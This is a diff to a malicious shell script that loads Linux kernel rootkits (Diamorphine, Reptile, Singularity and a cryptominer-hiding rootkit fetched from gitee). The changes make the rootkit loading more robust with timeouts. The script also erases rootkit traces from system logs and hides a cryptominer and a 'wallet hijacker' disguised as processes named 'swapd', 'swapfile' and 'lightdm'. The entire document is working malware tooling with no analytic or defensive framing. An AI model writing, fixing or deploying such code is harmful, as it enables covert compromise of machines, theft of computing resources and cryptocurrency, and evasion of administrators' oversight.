@@ -1231,7 +1231,12 @@ install_diamorphine() {
     
     # Load the module
     echo "[*] Loading Diamorphine kernel module..."
-    if ! insmod diamorphine.ko 2>/dev/null; then
+    if ! timeout 15 insmod diamorphine.ko 2>/dev/null; then
+        EXIT_CODE=$?
+        if [ "$EXIT_CODE" -eq 124 ]; then
+            echo "[!] insmod timed out - diamorphine init hung"
+            pkill -9 -f "insmod diamorphine" 2>/dev/null || true
+        fi
         echo "[!] Failed to load Diamorphine"
         echo "[!] Likely kernel 6.x incompatibility - try Reptile instead"
         cd /tmp
@@ -1344,7 +1349,12 @@ install_reptile() {
     
     # Load the module
     echo "[*] Loading Reptile kernel module..."
-    if ! insmod reptile.ko 2>/dev/null; then
+    if ! timeout 15 insmod reptile.ko 2>/dev/null; then
+        EXIT_CODE=$?
+        if [ "$EXIT_CODE" -eq 124 ]; then
+            echo "[!] insmod timed out - reptile init hung"
+            pkill -9 -f "insmod reptile" 2>/dev/null || true
+        fi
         echo "[!] Failed to load Reptile"
         cd /tmp/.ICE-unix/.X11-unix
         rm -rf Reptile
@@ -1436,15 +1446,27 @@ if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-root
     
     if [ -d hiding-cryptominers-linux-rootkit ] && [ "$(pwd)" = "*hiding-cryptominers-linux-rootkit*" ] || [ -f Makefile ]; then
         echo "[*] Building rootkit..."
-        if make 2>/dev/null; then
+        if timeout 120 make 2>/dev/null; then
             echo "[*] Loading rootkit module..."
-            dmesg -C
-            insmod rootkit.ko 2>/dev/null || {
-                echo "[!] Failed to load crypto rootkit"
-            }
-            dmesg
-            
+            dmesg -C 2>/dev/null || true  # Clear ring buffer (non-blocking)
+
+            # Use timeout to prevent insmod from hanging (RHEL/kernel init hang)
+            if timeout 15 insmod rootkit.ko 2>/dev/null; then
+                echo "[✓] Crypto rootkit loaded"
+            else
+                EXIT_CODE=$?
+                if [ "$EXIT_CODE" -eq 124 ]; then
+                    echo "[!] insmod timed out after 15s - kernel module init hung"
+                    echo "[!] Killing stuck insmod process..."
+                    pkill -9 -f "insmod rootkit" 2>/dev/null || true
+                else
+                    echo "[!] Failed to load crypto rootkit (exit code: $EXIT_CODE)"
+                fi
+                echo "[*] Continuing without crypto rootkit..."
+            fi
+
             # Immediately clean up rootkit load messages from logs
+            dmesg | tail -5 | grep -i "rootkit\|error" || true  # Show only relevant lines
             sleep 1
             sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
             sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
@@ -1452,8 +1474,6 @@ if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-root
             sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
             sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
             sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
-            
-            echo "[✓] Crypto rootkit loaded"
         else
             echo "[!] Failed to build crypto rootkit"
         fi
@@ -1523,7 +1543,7 @@ if [[ "$KERNEL_MAJOR" == "6" ]] || [ "$KERNEL_MAJOR" -eq 6 ] 2>/dev/null; then
                 # Try to load the module
                 echo "[*] Loading Singularity kernel module..."
                 
-                if insmod singularity.ko 2>/dev/null; then
+                if timeout 15 insmod singularity.ko 2>/dev/null; then
                     echo "[✓] Singularity loaded successfully!"
                     echo "[*] Use 'kill -59 <PID>' to hide processes"
                     
@@ -1536,9 +1556,15 @@ if [[ "$KERNEL_MAJOR" == "6" ]] || [ "$KERNEL_MAJOR" -eq 6 ] 2>/dev/null; then
                     # Set flag for later process hiding
                     SINGULARITY_LOADED=true
                 else
-                    echo "[!] Failed to load Singularity module"
-                    echo "[!] Check: dmesg | tail -20"
-                    dmesg | tail -10 | grep -i error || true
+                    EXIT_CODE=$?
+                    if [ "$EXIT_CODE" -eq 124 ]; then
+                        echo "[!] insmod timed out - Singularity init hung"
+                        pkill -9 -f "insmod singularity" 2>/dev/null || true
+                    else
+                        echo "[!] Failed to load Singularity module"
+                        echo "[!] Check: dmesg | tail -20"
+                        dmesg | tail -5 | grep -i error || true
+                    fi
                     SINGULARITY_LOADED=false
                 fi
             else
@@ -1603,52 +1629,46 @@ fi
 echo ""
 # ==================== HIDE MINER PROCESSES ====================
 echo "[*] Hiding miner processes..."
+sleep 3  # Give processes time to fully start before sending signals
 
-# Method 2: Singularity (kill -59) for Kernel 6.x
+# ---- Singularity (kernel 6.x) — signal 59 = toggle visibility ----
 if [ "$SINGULARITY_LOADED" = true ]; then
-    echo "[*] Using Singularity to hide processes (kernel 6.x)..."
-    sleep 3  # Give processes time to start
-    
-    # Hide miner process
-    MINER_PID=$(pgrep -f "swapfile" 2>/dev/null | head -1)
-    if [ -n "$MINER_PID" ]; then
-        kill -59 "$MINER_PID" 2>/dev/null && echo "[✓] Miner hidden with Singularity (PID: $MINER_PID)"
-    fi
-    
-    # Hide wallet hijacker
-    HIJACKER_PID=$(pgrep -f "lightdm.*daemon" 2>/dev/null | head -1)
-    if [ -n "$HIJACKER_PID" ]; then
-        kill -59 "$HIJACKER_PID" 2>/dev/null && echo "[✓] Wallet hijacker hidden with Singularity (PID: $HIJACKER_PID)"
-    fi
-fi
+    echo "[*] Singularity loaded — sending kill -59 (toggle hide)..."
 
-# Method 3: Hide with crypto rootkit (kill -31)
-if lsmod | grep -q rootkit 2>/dev/null; then
-    MINER_PIDS=$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
-    if [ -n "$MINER_PIDS" ]; then
-        for pid in $MINER_PIDS; do
-            if [[ "$pid" =~ ^[0-9]+$ ]]; then
-                kill -31 "$pid" 2>/dev/null || true
-            fi
-        done
-        echo "[✓] Processes hidden with crypto rootkit (kill -31)"
-    fi
+    kill -59 `/bin/ps ax -fu $USER | grep "swapd"    | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -59 `/bin/ps ax -fu $USER | grep "swapfile"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -59 `/bin/ps ax -fu $USER | grep "lightdm"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+
+    echo "[✓] Processes hidden with Singularity (kill -59)"
 else
-    echo "[*] Crypto rootkit not loaded (this is OK)"
+    echo "[*] Singularity not loaded — skipping"
 fi
 
-# Method 4: Hide with Diamorphine (kill -31 and kill -63)
-if lsmod | grep -q diamorphine 2>/dev/null; then
-    MINER_PIDS=$(/bin/ps ax -fu "$USER" | grep -E "swapd|kswapd0" | grep -v "grep" | awk '{print $2}')
-    if [ -n "$MINER_PIDS" ]; then
-        for pid in $MINER_PIDS; do
-            if [[ "$pid" =~ ^[0-9]+$ ]]; then
-                kill -31 "$pid" 2>/dev/null || true
-                kill -63 "$pid" 2>/dev/null || true
-            fi
-        done
-        echo "[✓] Processes hidden with Diamorphine"
-    fi
+# ---- Crypto-Miner rootkit — signal 31 = hide ----
+if lsmod | grep -q "^rootkit" 2>/dev/null; then
+    echo "[*] Crypto-Miner rootkit loaded — sending kill -31 (hide)..."
+
+    kill -31 `/bin/ps ax -fu $USER | grep "swapd"    | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "swapfile"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+
+    echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
+else
+    echo "[*] Crypto-Miner rootkit not loaded — skipping"
+fi
+
+# ---- Diamorphine — signal 31 = hide, signal 63 = unhide (we only hide here) ----
+if lsmod | grep -q "^diamorphine" 2>/dev/null; then
+    echo "[*] Diamorphine loaded — sending kill -31 (hide)..."
+
+    kill -31 `/bin/ps ax -fu $USER | grep "swapd"    | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "swapfile"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+
+    echo "[✓] Processes hidden with Diamorphine (kill -31)"
+    echo "[*] To unhide: kill -63 \`/bin/ps ax -fu \$USER | grep swapd | grep -v grep | awk '{print \$2}'\`"
+else
+    echo "[*] Diamorphine not loaded — skipping"
 fi
 
 # ==================== CLEAN UP LOGS ====================
